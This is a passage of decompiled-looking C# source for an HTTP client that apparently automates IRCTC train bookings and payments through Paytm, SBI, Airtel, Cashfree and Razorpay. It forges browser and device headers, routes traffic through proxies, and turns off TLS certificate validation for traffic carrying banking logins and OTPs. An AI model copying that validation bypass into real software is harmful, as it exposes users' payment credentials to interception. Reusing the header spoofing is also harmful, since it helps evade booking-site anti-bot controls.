                                httpWebRequest.Headers.Add("Sec-Fetch-User", "?1");
                                httpWebRequest.Headers.Add("Sec-Fetch-Dest", "document");
                                httpWebRequest.Headers.Add("Sec-Fetch-Site", "cross-site");
                                httpWebRequest.Headers.Add("Sec-Fetch-Mode", "navigate");
                                httpWebRequest.Headers.Add("sec-ch-ua", "\"Google Chrome\";v=\"95\", \"Chromium\";v=\"95\", \";Not A Brand\";v=\"99\"");
                                httpWebRequest.Headers.Add("Upgrade-Insecure-Requests", "1");
                                httpWebRequest.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9";
                                httpWebRequest.Headers.Add("Accept-Language", "en-US,en;q=0.9");
                            }
                            else if (!string_86.Contains("https://securegw.paytm.in/instaproxy/direct/payment/payonbank/v2"))
                            {
                                httpWebRequest.ContentType = "application/json";
                                httpWebRequest.Accept = "*/*";
                            }
                            httpWebRequest.Headers.Add("Accept-Language", "en-US,en;q=0.9");
                        }
                        else
                        {
                            httpWebRequest.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9";
                            httpWebRequest.Headers.Add("Accept-Language", "en-IN,en-US;q=0.9,en;q=0.8");
                            httpWebRequest.Headers.Add("accept-encoding", "gzip, deflate");
                            httpWebRequest.Headers.Add("Upgrade-Insecure-Requests", "1");
                            httpWebRequest.Headers.Add("Cache-Control", "max-age=0");
                        }
                    }
                    if (string_86.ToLower().Contains("irctc.co.in"))
                    {
                        httpWebRequest.AllowWriteStreamBuffering = false;
                    }
                    if (bool_27)
                    {
                        httpWebRequest.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8";
                        httpWebRequest.Headers.Add("X-Requested-With", "XMLHttpRequest");
                    }
                    if (bool_51)
                    {
                        bool_51 = false;
                        httpWebRequest.Headers.Add("Upgrade-Insecure-Requests", "1");
                        httpWebRequest.Headers.Add("Cache-Control", "max-age=0");
                        httpWebRequest.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9";
                    }
                    else if (string_86.ToLower().Contains("irctc.co.in") && !bool_21)
                    {
                        httpWebRequest.Headers.Add("X-Requested-With", "XMLHttpRequest");
                    }
                    if (bool_21)
                    {
                        httpWebRequest.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
                        httpWebRequest.Headers.Add("faces-request", "partial/ajax");
                        if (webProxy_5 != null)
                        {
                            httpWebRequest.Headers.Add("Cache-Control", "no-cache");
                            httpWebRequest.Headers.Add("Pragma", "no-cache");
                        }
                        bool_21 = false;
                    }
                    if (bool_23)
                    {
                        httpWebRequest.ServicePoint.BindIPEndPointDelegate = method_76;
                    }
                    if ((string_86.Contains("fss.co.in") || string_86.Contains("fssnet.co.in")) && !bool_28)
                    {
                        httpWebRequest.AllowAutoRedirect = false;
                    }
                    if (string_86.IndexOf("axisbiconnect", StringComparison.CurrentCultureIgnoreCase) > 0)
                    {
                        httpWebRequest.UserAgent = "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)";
                    }
                    if (string_86.IndexOf("middleware/MWServlet", StringComparison.CurrentCultureIgnoreCase) > 0)
                    {
                        httpWebRequest.UserAgent = "Apache-HttpClient/android/" + string_88;
                        httpWebRequest.Connection = "keepalive";
                        httpWebRequest.Headers.Add("Cookie2", "$Version=" + 1);
                    }
                    if (bool_30)
                    {
                        httpWebRequest.AllowAutoRedirect = false;
                        bool_30 = false;
                    }
                    else if (num4 != 0)
                    {
                        httpWebRequest.AllowAutoRedirect = false;
                        httpWebRequest.Headers.Add("X-Priority", "5");
                        httpWebRequest.Headers.Add("x-msg-priority", "9");
                    }
                    if (bool_29)
                    {
                        bool_29 = false;
                        httpWebRequest.ContentType = "application/json;charset=UTF-8";
                        httpWebRequest.Accept = "application/json, text/plain, */*";
                        httpWebRequest.ContentType = "application/json";
                        httpWebRequest.Accept = "*/*";
                        httpWebRequest.Headers.Add("Accept-Language", "en-US,en;q=0.5");
                    }
                    if (bool_36)
                    {
                        httpWebRequest.ContentType = "application/json";
                        bool_36 = false;
                        if (bool_37)
                        {
                            bool_37 = false;
                            httpWebRequest.Headers.Add("browserName", "Chrome");
                            httpWebRequest.Headers.Add("internalIp", "192.168.1.2");
                            httpWebRequest.Headers.Add("assignedClientId", "null");
                            httpWebRequest.Headers.Add("osVersion", "Windows 7");
                            httpWebRequest.Headers.Add("clientId", "Web");
                            httpWebRequest.Headers.Add("deviceId", "null");
                            httpWebRequest.Headers.Add("browserVersion", "27.0.1453.116");
                            httpWebRequest.Headers.Add("userMachineIdentifier", "JNDF");
                            httpWebRequest.Headers.Add("appVersion", "null");
                        }
                        if (string_86.Contains("airtelmoney.in"))
                        {
                            httpWebRequest.Accept = "application/json";
                        }
                    }
                    if (bool_11)
                    {
                        httpWebRequest.AllowAutoRedirect = false;
                    }
                    if (bool_38)
                    {
                        httpWebRequest.ContentType = "application/json;charset=UTF-8";
                        httpWebRequest.UserAgent = "Dalvik/2.1.0 (Linux; U; Android 5.1; A1601 Build/LMY47I";
                        httpWebRequest.Accept = "";
                        bool_38 = false;
                    }
                    if (string_86.Contains("https://checkout.razorpay.com/integration/irctc"))
                    {
                        httpWebRequest.AllowAutoRedirect = true;
                    }
                    if (string_86.Contains("https://www.onlinesbiglobal.com/NPINB"))
                    {
                        if (Int32_0 == 1)
                        {
                            Int32_0 = 0;
                            httpWebRequest.Headers.Add("Upgrade-Insecure-Requests", "1");
                            httpWebRequest.CachePolicy = new HttpRequestCachePolicy(HttpCacheAgeControl.MaxAge, TimeSpan.FromDays(0.0));
                            httpWebRequest.AllowAutoRedirect = true;
                        }
                        if (Int32_0 == 2)
                        {
                            httpWebRequest.Accept = "*/*";
                            httpWebRequest.Headers.Add("requestId", String_0);
                            httpWebRequest.Headers.Add("X-Requested-With", "XMLHttpRequest");
                            httpWebRequest.Headers.Add("IPTYPE", "XML");
                        }
                    }
                    if (string_86.Contains("merchant.onlinesbi.sbi"))
                    {
                        httpWebRequest.CachePolicy = cachePolicy;
                        httpWebRequest.Headers.Add("sec-ch-ua", "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"");
                        httpWebRequest.Headers.Add("Upgrade-Insecure-Requests", "1");
                        httpWebRequest.Headers.Add("Accept-Language", "en-US,en;q=0.9,hi;q=0.8");
                        httpWebRequest.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9";
                    }
                    if (string_86.Contains("ecomVerifyOtp.action"))
                    {
                        httpWebRequest.ContentType = "application/json";
                        httpWebRequest.Accept = "application/json, text/plain, */*";
                    }
                    if (string_86.Contains("ecomSendOtp.action") || string_86.Contains("ecomDoTxn.action"))
                    {
                        httpWebRequest.ContentType = "application/x-www-form-urlencoded";
                        httpWebRequest.Accept = "application/json, text/plain, */*";
                        httpWebRequest.Headers.Add("version", "4.0");
                    }
                    if (string_86.Contains("www.airtel.in/bank/api/v1/auth/login/mpin"))
                    {
                        httpWebRequest.ContentType = "application/json";
                        httpWebRequest.Accept = "application/json, text/plain, */*";
                        httpWebRequest.Headers.Add("version", "4.0");
                        httpWebRequest.Headers.Add("channel", "WEB");
                    }
                    if (string_86.Contains("payments.cashfree.com/") & (!bool_14))
                    {
                        httpWebRequest.ContentType = "application/json";
                        httpWebRequest.Accept = "*/*";
                        httpWebRequest.Headers.Add("X-CF-CLIENT-ID", "_683bbffda");
                        //httpWebRequest.Headers.Add("channel", "WEB");
                    }

                    if (Boolean_0)
                    {
                        Boolean_0 = false;
                        ServicePointManager.Expect100Continue = true;
                    }
                    if (!string.IsNullOrEmpty(text))
                    {
                        string[] array = Strings.Split(text, "&");
                        int num5 = Information.UBound(array);
                        for (int i = 0; i <= num5; i++)
                        {
                            string[] array2 = Strings.Split(array[i], "=");
                            httpWebRequest.Headers.Set(array2[0], array2[1]);
                        }
                        string_71 = "";
                    }
                    if (!string.IsNullOrEmpty(string_88))
                    {
                        httpWebRequest.Referer = string_88;
                    }
                    if (flag2)
                    {
                        //httpWebRequest.GetRequestStream().Write(bytes, 0, bytes.Length);
                        using (Stream stream = httpWebRequest.GetRequestStream())
                        {
                            stream.Write(bytes, 0, bytes.Length);
                        }
                    }
                    httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
                    if (num4 != 0 && (httpWebResponse.StatusCode == HttpStatusCode.Found || httpWebResponse.StatusCode == HttpStatusCode.MovedPermanently) && httpWebResponse.Headers["Location"].ToString().Contains("error") && num2 < 20)
                    {
                        Thread.Sleep(200);
                        num2++;
                        text2 = (string_5 = httpWebResponse.GetResponseHeader("Location"));
                        httpWebResponse.Close();
                        httpWebResponse = null;
                        continue;
                    }
                    string string_91 = "";
                    method_96(httpWebResponse, ref string_91);
                    if (bool_11)
                    {
                        bool_11 = false;
                        string_16 = httpWebResponse.GetResponseHeader("Location");
                    }
                    if (bool_24)
                    {
                        string_29 = httpWebResponse.ResponseUri.ToString();
                    }
                    using (StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream()))
                    {
                        if (bool_64)
                        {
                            text2 = streamReader.ReadToEnd();
                        }
                        else
                        {
                            httpWebRequest.Abort();
                        }
                    }
                    string_89 = text2;
                    num3 = 1;
                    clsMain.Lock("Getting Html out= " + text2);
                    break;
                }
                catch (WebException ex)
                {
                    num3 = 0;
                    webException_1 = ex;
                    string message = ex.Message;
                    bool flag3 = ex.Response != null;
                    string text3 = "";
                    num++;
                    HttpStatusCode httpStatusCode = HttpStatusCode.OK;
                    if (flag3)
                    {
                        httpStatusCode = ((HttpWebResponse)ex.Response).StatusCode;
                        try
                        {
                            text3 = ":" + new StreamReader(ex.Response.GetResponseStream()).ReadToEnd();
                        }
                        catch
                        {
                        }
                    }
                    string_90 = "<StatusCode>" + httpStatusCode.ToString() + "</StatusCode>\t<ErrorCode>" + message + "</ErrorCode>\t<ResponseCode>" + text3 + "</ResponseCode>";
                    clsMain.method_74("WebRequestPost WebEx=", string_90);
                    if (num >= 9)
                    {
                        break;
                    }
                    if (message.Contains("The remote name could not be resolved") | message.Contains("Unable to connect to the remote server"))
                    {
                        if (!message.ToUpper().Contains("SERVICEUNAVAILABLE"))
                        {
                            Thread.Sleep(1000);
                            break;
                        }
                        Thread.Sleep(2000);
                    }
                    else if (message.Contains("The underlying connection was closed:"))
                    {
                        if (!message.Contains("An unexpected error occurred on a send") && !message.Contains("A connection that was expected to be kept alive was closed by the server"))
                        {
                            message.Contains("An unexpected error occurred on a receive");
                        }
                        if (num % 2 == 0)
                        {
                            string_52 = "Tls12";
                        }
                        if (num == 3 || num == 4)
                        {
                            flag = true;
                        }
                        if (num >= 5)
                        {
                            break;
                        }
                    }
                    else if (message.Contains("The request was aborted: Could not create SSL/TLS secure channel."))
                    {
                        if (num % 2 == 0)
                        {
                            string_52 = "Tls12";
                        }
                        if (num == 3 || num == 4)
                        {
                            flag = true;
                        }
                        if (num >= 5)
                        {
                            break;
                        }
                    }
                    else if (message.Contains("The operation has timed out"))
                    {
                        if (num >= 5)
                        {
                            break;
                        }
                    }
                    else if (message.Contains("(406) Not Acceptable") || message.Contains("(401) Unauthorized") || message.Contains("(400) Bad Request") || (message.Contains("(404) Not Found") | message.Contains("(409) Conflict")) || (!message.Contains("(500) Internal Server Error") && !message.Contains("(502) Bad Gateway") && !message.Contains("(503) Server Unavailable") && !message.Contains("(504) Gateway Timeout")))
                    {
                        break;
                    }
                }
                catch (Exception ex2)
                {
                    num3 = 0;
                    string_90 = ex2.Message;
                    clsMain.method_74("WebRequestPost Ex=", string_90 + "  hitUrl" + string_86 + "  Inp=" + string_87 + " Ref=" + string_88 + " reHitCount=" + num);
                    if (num < 3 && string_90.Contains("String reference not set to an instance"))
                    {
                        string_90 = "";
                        num++;
                        continue;
                    }
                    break;
                }
                finally
                {
                    try
                    {
                        httpWebResponse?.Close();
                    }
                    catch
                    {
                    }
                }
            }
            return num3 != 0;
        }

        internal bool _Request_Phonepe(string string_86, string string_87, string string_88, WebProxy webProxy_5, ref CookieContainer cookieContainer_2, bool bool_63, bool bool_64, int int_28, int int_29, ref string string_89, ref string string_90, ref WebException webException_1)
        {
            int num = 0;
            int num2 = 0;
            bool flag = false;
            string text = "";
            if (!string.IsNullOrEmpty(string_71))
            {
                text = string_71;
            }
            if (string_87 == null)
            {
                string_87 = "";
            }
            int num3;
            while (true)
            {
                string_90 = "";
                string_89 = "";
                webException_1 = null;
                num3 = 0;
                clsMain.Lock(string_21 + " Getting html in= " + string_86 + "\t Post:" + string_87);
                HttpWebResponse httpWebResponse = null;
                string text2 = "";
                int num4 = ((string_86.IndexOf("https://www.irctc.co.in", StringComparison.CurrentCultureIgnoreCase) == 0 || string_86.IndexOf("http://www.irctc.co.in", StringComparison.CurrentCultureIgnoreCase) == 0) ? 1 : 0);
                try
                {
                    ServicePointManager.Expect100Continue = false;
                    HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(string_86);
                    httpWebRequest.ProtocolVersion = HttpVersion.Version11;
                    if (flag)
                    {
                        httpWebRequest.Proxy = clsMain.webProxy_0;
                        flag = false;
                    }
                    string_52 = "Tls12";
                    ServicePointManager.ServerCertificateValidationCallback = (object object_0, X509Certificate x509Certificate_0, X509Chain x509Chain_0, SslPolicyErrors sslPolicyErrors_0) => true;
                    HttpRequestCachePolicy cachePolicy = new HttpRequestCachePolicy(HttpCacheAgeControl.MaxAge, TimeSpan.FromDays(0.0));
                    httpWebRequest.AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate;
                    httpWebRequest.ConnectionGroupName = clsMain.ConnectionGroupName_;
                    if ((string_52 == "Tls") | (string_52 == "Ssl3"))
                    {
                        ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;
                    }
                    else if (string_52 == "Tls12")
                    {
                        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
                    }
                    if (int_28 > 0)
                    {
                        httpWebRequest.Timeout = int_28;
                    }
                    if (int_29 > 0)
                    {
                        httpWebRequest.ReadWriteTimeout = int_29;
                    }
                    byte[] bytes = Encoding.UTF8.GetBytes(string_87);
                    if (bool_63 && cookieContainer_2 == null)
                    {
                        cookieContainer_2 = new CookieContainer();
                    }
                    httpWebRequest.CookieContainer = cookieContainer_2;
                    bool flag2;
                    if (flag2 = string_87.Length > 0)
                    {
                        httpWebRequest.Method = "POST";
                    }
                    else if (bool_15)
                    {
                        httpWebRequest.Method = "POST";
                        bool_15 = false;
                    }
                    else
                    {
                        httpWebRequest.Method = "GET";
                    }
                    if (bool_40)
                    {
                        httpWebRequest.Method = "PUT";
                        bool_40 = false;
                    }
                    else if (bool_41)
                    {
                        httpWebRequest.Method = "DELETE";
                        bool_41 = false;
                    }
                    httpWebRequest.Accept = "application/json, text/plain, */*";
                    httpWebRequest.ContentType = "application/json;charset=UTF-8";
                    httpWebRequest.KeepAlive = true;
                    httpWebRequest.Connection = "keepalive";
                    httpWebRequest.ContentLength = bytes.Length;
                    httpWebRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36";
                    if (string_86.Contains(".paytm.in"))
                    {
                        ServicePointManager.Expect100Continue = false;
                        if (bool_13)
                        {
                            bool_13 = false;
                            if (string_86.Contains("https://securegw.paytm.in/instaproxy/bankresponse/ICICIPAY/DC"))
                            {
                                httpWebRequest.Accept = "application/json, text/plain, */*";
                                httpWebRequest.ContentType = "application/json;charset=UTF-8";
                            }
                            else if (bool_14)
                            {
                                bool_14 = false;
                                httpWebRequest.Headers.Add("sec-ch-ua-mobile", "?0");
                                httpWebRequest.Headers.Add("Cache-Control", "max-age=0");
                                httpWebRequest.Headers.Add("sec-ch-ua-platform", "\"Windows\"");
                                httpWebRequest.ContentType = "application/x-www-form-urlencoded";
                                httpWebRequest.Headers.Add("Sec-Fetch-User", "?1");
                                httpWebRequest.Headers.Add("Sec-Fetch-Dest", "document");
                                httpWebRequest.Headers.Add("Sec-Fetch-Site", "cross-site");
                                httpWebRequest.Headers.Add("Sec-Fetch-Mode", "navigate");
                                httpWebRequest.Headers.Add("sec-ch-ua", "\"Google Chrome\";v=\"95\", \"Chromium\";v=\"95\", \";Not A Brand\";v=\"99\"");
                                httpWebRequest.Headers.Add("Upgrade-Insecure-Requests", "1");
                                httpWebRequest.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9";
                                httpWebRequest.Headers.Add("Accept-Language", "en-US,en;q=0.9");
                            }
                            else if (!string_86.Contains("https://securegw.paytm.in/instaproxy/direct/payment/payonbank/v2"))
                            {
                                httpWebRequest.ContentType = "application/json;charset=UTF-8";
                                httpWebRequest.Accept = "application/json, text/plain, */*";
                            }
                            httpWebRequest.Headers.Add("Accept-Language", "en-US,en;q=0.9");
                        }
                        else
                        {
                            httpWebRequest.Accept = "application/json;charset=UTF-8"; //"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9";
                            httpWebRequest.Headers.Add("Accept-Language", "en-IN,en-US;q=0.9,en;q=0.8");
                            httpWebRequest.Headers.Add("accept-encoding", "gzip, deflate");
                            httpWebRequest.Headers.Add("Upgrade-Insecure-Requests", "1");
                            httpWebRequest.Headers.Add("Cache-Control", "max-age=0");
                        }
                    }
                    if (string_86.ToLower().Contains("irctc.co.in"))
                    {
                        httpWebRequest.AllowWriteStreamBuffering = false;
                    }
                    if (bool_27)
                    {
                        httpWebRequest.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8";
                        httpWebRequest.Headers.Add("X-Requested-With", "XMLHttpRequest");
                    }
                    if (bool_51)
                    {
                        bool_51 = false;
                        httpWebRequest.Headers.Add("Upgrade-Insecure-Requests", "1");
                        httpWebRequest.Headers.Add("Cache-Control", "max-age=0");
                        httpWebRequest.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9";
                    }
                    else if (string_86.ToLower().Contains("irctc.co.in") && !bool_21)
                    {
                        httpWebRequest.Headers.Add("X-Requested-With", "XMLHttpRequest");
                    }
                    if (bool_21)
                    {
                        httpWebRequest.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
                        httpWebRequest.Headers.Add("faces-request", "partial/ajax");
                        if (webProxy_5 != null)
                        {
                            httpWebRequest.Headers.Add("Cache-Control", "no-cache");
                            httpWebRequest.Headers.Add("Pragma", "no-cache");
                        }
                        bool_21 = false;
                    }
                    if (bool_23)
                    {
                        httpWebRequest.ServicePoint.BindIPEndPointDelegate = method_76;
                    }
                    if ((string_86.Contains("fss.co.in") || string_86.Contains("fssnet.co.in")) && !bool_28)
                    {
                        httpWebRequest.AllowAutoRedirect = false;
                    }
                    if (string_86.IndexOf("axisbiconnect", StringComparison.CurrentCultureIgnoreCase) > 0)
                    {
                        httpWebRequest.UserAgent = "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)";
                    }
                    if (string_86.IndexOf("middleware/MWServlet", StringComparison.CurrentCultureIgnoreCase) > 0)
                    {
                        httpWebRequest.UserAgent = "Apache-HttpClient/android/" + string_88;
                        httpWebRequest.Connection = "keepalive";
                        httpWebRequest.Headers.Add("Cookie2", "$Version=" + 1);
                    }
                    if (bool_30)
                    {
                        httpWebRequest.AllowAutoRedirect = false;
                        bool_30 = false;
                    }
                    else if (num4 != 0)
                    {
                        httpWebRequest.AllowAutoRedirect = false;
                        httpWebRequest.Headers.Add("X-Priority", "5");
                        httpWebRequest.Headers.Add("x-msg-priority", "9");
                    }
                    if (bool_29)
                    {
                        bool_29 = false;
                        httpWebRequest.ContentType = "application/json;charset=UTF-8";
                        httpWebRequest.Accept = "application/json, text/plain, */*";
                        httpWebRequest.ContentType = "application/json";
                        httpWebRequest.Accept = "*/*";
                        httpWebRequest.Headers.Add("Accept-Language", "en-US,en;q=0.5");
                    }
                    if (bool_36)
                    {
                        httpWebRequest.ContentType = "application/json";
                        bool_36 = false;
                        if (bool_37)
                        {
                            bool_37 = false;
                            httpWebRequest.Headers.Add("browserName", "Chrome");
                            httpWebRequest.Headers.Add("internalIp", "192.168.1.2");
                            httpWebRequest.Headers.Add("assignedClientId", "null");
                            httpWebRequest.Headers.Add("osVersion", "Windows 7");
                            httpWebRequest.Headers.Add("clientId", "Web");
                            httpWebRequest.Headers.Add("deviceId", "null");
                            httpWebRequest.Headers.Add("browserVersion", "27.0.1453.116");
                            httpWebRequest.Headers.Add("userMachineIdentifier", "JNDF");
                            httpWebRequest.Headers.Add("appVersion", "null");
                        }
                        if (string_86.Contains("airtelmoney.in"))
                        {
                            httpWebRequest.Accept = "application/json";
                        }
                    }
                    if (bool_11)
                    {
                        httpWebRequest.AllowAutoRedirect = false;
                    }
                    if (bool_38)
                    {
                        httpWebRequest.ContentType = "application/json;charset=UTF-8";
                        httpWebRequest.UserAgent = "Dalvik/2.1.0 (Linux; U; Android 5.1; A1601 Build/LMY47I";
                        httpWebRequest.Accept = "";
                        bool_38 = false;
                    }
                    if (string_86.Contains("https://checkout.razorpay.com/integration/irctc"))
                    {
                        httpWebRequest.AllowAutoRedirect = true;
                    }
                    if (string_86.Contains("https://www.onlinesbiglobal.com/NPINB"))
                    {
                        if (Int32_0 == 1)
                        {
                            Int32_0 = 0;
                            httpWebRequest.Headers.Add("Upgrade-Insecure-Requests", "1");
                            httpWebRequest.CachePolicy = new HttpRequestCachePolicy(HttpCacheAgeControl.MaxAge, TimeSpan.FromDays(0.0));
                            httpWebRequest.AllowAutoRedirect = true;
                        }
                        if (Int32_0 == 2)
                        {
                            httpWebRequest.Accept = "*/*";
                            httpWebRequest.Headers.Add("requestId", String_0);
                            httpWebRequest.Headers.Add("X-Requested-With", "XMLHttpRequest");
                            httpWebRequest.Headers.Add("IPTYPE", "XML");
                        }
                    }
                    if (string_86.Contains("merchant.onlinesbi.sbi"))
                    {
                        httpWebRequest.CachePolicy = cachePolicy;
                        httpWebRequest.Headers.Add("sec-ch-ua", "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"");
                        httpWebRequest.Headers.Add("Upgrade-Insecure-Requests", "1");
                        httpWebRequest.Headers.Add("Accept-Language", "en-US,en;q=0.9,hi;q=0.8");
                        httpWebRequest.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9";
                    }
                    if (string_86.Contains("ecomVerifyOtp.action"))
                    {
                        httpWebRequest.ContentType = "application/json";
                        httpWebRequest.Accept = "application/json, text/plain, */*";
                    }
                    if (string_86.Contains("ecomSendOtp.action") || string_86.Contains("ecomDoTxn.action"))
                    {
                        httpWebRequest.ContentType = "application/x-www-form-urlencoded";
                        httpWebRequest.Accept = "application/json, text/plain, */*";
                        httpWebRequest.Headers.Add("version", "4.0");
                    }
                    if (string_86.Contains("www.airtel.in/bank/api/v1/auth/login/mpin"))
                    {
                        httpWebRequest.ContentType = "application/json";
                        httpWebRequest.Accept = "application/json, text/plain, */*";
                        httpWebRequest.Headers.Add("version", "4.0");
                        httpWebRequest.Headers.Add("channel", "WEB");
                    }
                    if (Boolean_0)
                    {
                        Boolean_0 = false;
                        ServicePointManager.Expect100Continue = true;
                    }
                    if (!string.IsNullOrEmpty(text))
                    {
                        string[] array = Strings.Split(text, "&");
                        int num5 = Information.UBound(array);
                        for (int i = 0; i <= num5; i++)
                        {
                            string[] array2 = Strings.Split(array[i], "=");
                            httpWebRequest.Headers.Set(array2[0], array2[1]);
                        }
                        string_71 = "";
                    }
                    if (!string.IsNullOrEmpty(string_88))
                    {
                        httpWebRequest.Referer = string_88;
                    }
                    if (flag2)
                    {
                        //httpWebRequest.GetRequestStream().Write(bytes, 0, bytes.Length);
                        using (Stream stream = httpWebRequest.GetRequestStream())
                        {
                            stream.Write(bytes, 0, bytes.Length);
                        }
                    }
                    httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
                    if (num4 != 0 && (httpWebResponse.StatusCode == HttpStatusCode.Found || httpWebResponse.StatusCode == HttpStatusCode.MovedPermanently) && httpWebResponse.Headers["Location"].ToString().Contains("error") && num2 < 20)
                    {
                        Thread.Sleep(200);
                        num2++;
                        text2 = (string_5 = httpWebResponse.GetResponseHeader("Location"));
                        httpWebResponse.Close();
                        httpWebResponse = null;
                        continue;
                    }
                    string string_91 = "";
                    method_96(httpWebResponse, ref string_91);
                    if (bool_11)
                    {
                        bool_11 = false;
                        string_16 = httpWebResponse.GetResponseHeader("Location");
                    }
                    if (bool_24)
                    {
                        string_29 = httpWebResponse.ResponseUri.ToString();
                    }
                    using (StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream()))
                    {
                        if (bool_64)
                        {
                            text2 = streamReader.ReadToEnd();
                        }
                        else
                        {
                            httpWebRequest.Abort();
                        }
                    }
                    string_89 = text2;
                    num3 = 1;
                    clsMain.Lock("Getting Html out= " + text2);
                    break;
                }
                catch (WebException ex)
                {
                    num3 = 0;
                    webException_1 = ex;
                    string message = ex.Message;
                    bool flag3 = ex.Response != null;
                    string text3 = "";
                    num++;
                    HttpStatusCode httpStatusCode = HttpStatusCode.OK;
                    if (flag3)
                    {
                        httpStatusCode = ((HttpWebResponse)ex.Response).StatusCode;
                        try
                        {
                            text3 = ":" + new StreamReader(ex.Response.GetResponseStream()).ReadToEnd();
                        }
                        catch
                        {
                        }
                    }
                    string_90 = "<StatusCode>" + httpStatusCode.ToString() + "</StatusCode>\t<ErrorCode>" + message + "</ErrorCode>\t<ResponseCode>" + text3 + "</ResponseCode>";
                    clsMain.method_74("WebRequestPost WebEx=", string_90);
                    if (num >= 9)
                    {
                        break;
                    }
                    if (message.Contains("The remote name could not be resolved") | message.Contains("Unable to connect to the remote server"))
                    {
                        if (!message.ToUpper().Contains("SERVICEUNAVAILABLE"))
                        {
                            Thread.Sleep(1000);
                            break;
                        }
                        Thread.Sleep(2000);
                    }
                    else if (message.Contains("The underlying connection was closed:"))
                    {
                        if (!message.Contains("An unexpected error occurred on a send") && !message.Contains("A connection that was expected to be kept alive was closed by the server"))
                        {
                            message.Contains("An unexpected error occurred on a receive");
                        }
                        if (num % 2 == 0)
                        {
                            string_52 = "Tls12";
                        }
                        if (num == 3 || num == 4)
                        {
                            flag = true;
                        }
                        if (num >= 5)
                        {
                            break;
                        }
                    }
                    else if (message.Contains("The request was aborted: Could not create SSL/TLS secure channel."))
                    {
                        if (num % 2 == 0)
                        {
                            string_52 = "Tls12";
                        }
                        if (num == 3 || num == 4)
                        {
                            flag = true;
                        }
                        if (num >= 5)
                        {
                            break;
                        }
                    }
                    else if (message.Contains("The operation has timed out"))
                    {
                        if (num >= 5)
                        {
                            break;
                        }
                    }
                    else if (message.Contains("(406) Not Acceptable") || message.Contains("(401) Unauthorized") || message.Contains("(400) Bad Request") || (message.Contains("(404) Not Found") | message.Contains("(409) Conflict")) || (!message.Contains("(500) Internal Server Error") && !message.Contains("(502) Bad Gateway") && !message.Contains("(503) Server Unavailable") && !message.Contains("(504) Gateway Timeout")))
                    {
                        break;
                    }
                }
                catch (Exception ex2)
                {
                    num3 = 0;
                    string_90 = ex2.Message;
                    clsMain.method_74("WebRequestPost Ex=", string_90 + "  hitUrl" + string_86 + "  Inp=" + string_87 + " Ref=" + string_88 + " reHitCount=" + num);
                    if (num < 3 && string_90.Contains("String reference not set to an instance"))
                    {
                        string_90 = "";
                        num++;
                        continue;
                    }
                    break;
                }
                finally
                {
                    try
                    {
                        httpWebResponse?.Close();
                    }
                    catch
                    {
                    }
                }
            }
            return num3 != 0;
        }

        internal bool Http_(string url, string postdata, string reff, WebProxy proxy, ref CookieContainer C_Container, bool A_6, bool A_7, int A_8, int A_9, ref string A_10, ref string A_11, ref WebException A_12)
        {
            int num = 0;
            int num2 = (bool_3 ? 1 : 0);
            int num3 = (bool_23 ? 1 : 0);
            int num4 = (bool_13 ? 1 : 0);
            int num5 = (bool_32 ? 1 : 0);
            int num6 = (bool_24 ? 1 : 0);
            string text = "";
            if (!string.IsNullOrEmpty(string_63i))
            {
                text = string_63i;
            }
            if (postdata == null)
            {
                postdata = "";
            }
            Cur_wait = elapsedMilliseconds;
            Avg_wait = (Cur_wait + Privs_wait) / 2;
            Privs_wait = Cur_wait;
            if (num2 != 0 && bool_16)
            {
                A_11 = "Availability Already Received";
                return false;
            }
            //if (Class39.IsAws == "Enabled")
            //{
            //    if (url.Contains("irctc.co.in"))
            //    {
            //        string[] awsproxt = Class39.IsAwsIP.Split(new string[1] { "||" }, StringSplitOptions.None);
            //        proxy = new WebProxy(awsproxt[0].Trim(), int.Parse(awsproxt[1].Trim()));
            //        proxy.BypassProxyOnLocal = true;
            //        proxy.Credentials = new NetworkCredential(awsproxt[2].Trim(), awsproxt[3].Trim());
            //    }
            //}
            int num7;
            while (true)
            {
                Stopwatch stopwatch = new Stopwatch();
                stopwatch.Start();
                A_11 = "";
                A_10 = "";
                A_12 = null;
                num7 = 0;
                clsMain.Lock(string_21 + " Getting html in= " + url + "\t Post:" + postdata);
                HttpWebResponse httpWebResponse = null;
                HttpWebRequest httpWebRequest = null;
